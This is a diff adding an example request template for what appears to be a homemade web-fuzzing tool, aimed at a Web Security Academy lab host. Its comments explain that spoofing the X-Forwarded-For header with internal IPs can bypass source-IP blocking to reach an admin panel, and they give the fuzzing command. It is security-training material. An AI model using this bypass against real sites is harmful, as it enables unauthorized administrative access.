@@ -1,0 +1,17 @@
+# Header-injection probe.
+#
+# Some apps trust the X-Forwarded-For header for "the real client IP"
+# (common when sitting behind a load balancer / CDN). If the app uses
+# that for IP allowlisting / blocking, spoofing the header bypasses it.
+#
+# Example use - check if 127.0.0.1 (or other internal IPs) reveal an
+# admin panel that's normally blocked by source-IP:
+#   echo -e "127.0.0.1\n10.0.0.1\n192.168.0.1\n172.16.0.1" > ips.txt
+#   python3 intruder.py examples/header-injection.txt \
+#       --payload ips.txt \
+#       --match-not-regex 'Forbidden|Access denied'
+#
+# Edit Host to your target.
+GET /admin HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+X-Forwarded-For: §IP§
